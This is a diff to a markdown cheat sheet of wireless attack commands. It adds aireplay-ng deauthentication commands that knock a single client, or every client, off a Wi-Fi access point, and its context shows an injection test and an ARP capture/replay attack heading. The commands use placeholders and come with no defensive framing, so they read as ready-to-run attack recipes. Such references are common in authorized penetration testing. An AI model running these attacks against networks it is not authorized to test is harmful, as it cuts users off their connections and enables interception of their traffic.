@@ -36,10 +36,16 @@ sudo aireplay-ng --test -e <essid> -a <bssid> <wlan_mon_interface|wmon>
 ```
 
 
-## Deauthentication
+## deauth - station
 ```bash
 sudo iw dev <wlan_mon_interface|wmon> set channel <wlan_channel> && 
 sudo aireplay-ng --deauth <count|5> -a <bssid> -c <wlan_station_mac> <wlan_mon_interface|wmon>
+```
+
+## deauth - bssid
+```bash
+sudo iw dev <wlan_mon_interface|wmon> set channel <wlan_channel> && 
+sudo aireplay-ng --deauth <count|5> -a <bssid> <wlan_mon_interface|wmon>
 ```
 
 ## ARP capture / replay attack
